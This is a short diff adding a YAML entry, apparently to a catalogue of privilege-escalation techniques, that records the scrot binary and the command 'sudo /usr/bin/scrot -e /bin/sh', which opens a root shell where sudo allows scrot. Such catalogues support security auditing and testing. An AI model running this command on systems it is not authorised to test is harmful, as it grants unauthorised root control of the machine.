@@ -1,0 +1,4 @@
+name: scrot
+binary_path: /usr/bin/scrot
+exploit_cmds:
+- sudo /usr/bin/scrot -e /bin/sh
